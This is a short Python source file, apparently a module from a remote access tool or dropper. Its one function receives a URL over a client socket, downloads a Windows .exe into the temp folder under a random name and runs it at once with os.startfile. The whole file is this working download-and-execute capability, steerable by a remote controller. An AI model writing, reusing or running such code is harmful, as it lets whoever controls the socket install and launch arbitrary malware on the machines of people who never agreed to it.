import requests
import tempfile
import random
import string
import os


def download_and_execute(client=None, auto_start=True, url=None):
    """
    Downloads exe files from the web into the temp folder and starts them
    :param client: client socket object to receive the url
    :param auto_start: auto start the downloaded exe file
    :param url: URL link of the exe file
    :return: path of exe file, return None if there was an error
    """
    if client is not None:
        url = client.receive()  # Receives URL link of the exe file

    # Check if it's a valid exe link
    if url[-4:] == '.exe':
        try:
            file = requests.get(url).content  # Gets files data

            # Save file to temp folder under a random name.
            path = tempfile.gettempdir() + '\\' + ''.join(random.choices(string.ascii_lowercase + string.digits, k=6)) + '.exe'
            with open(path, 'wb') as f:
                f.write(file)

            if auto_start:
                os.startfile(path)  # Starts file
            return path

        except Exception:
            return None
